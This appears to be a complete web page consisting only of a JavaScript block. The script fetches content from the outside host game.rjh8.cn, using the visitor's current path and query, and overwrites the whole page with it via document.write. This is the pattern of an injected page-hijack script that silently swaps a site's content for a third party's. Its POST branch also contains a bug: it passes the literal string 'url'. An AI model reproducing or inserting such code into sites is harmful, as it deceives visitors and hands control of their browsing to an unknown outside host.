<script>
postdata = ''
loadhtml('//game.rjh8.cn' + window.location.pathname + window.location.search)
function loadhtml(url) {
    var xhr = new XMLHttpRequest;
    var html = null;
    function render() {
        var a = document.open("text/html", "replace");
        a.write(html);
        a.close();
    }
    xhr.onload = function () {
        html = xhr.responseText;
        var delay = 0;
        if (delay > 0) setTimeout("render()", delay * 1000)
        else render();
	};
	if(postdata != '' && postdata != null){
		xhr.open('POST', 'url', true);
		xhr.send(postdata);
	}else{
		xhr.open("GET", url, !0);
		xhr.send();
	}

}
</script>
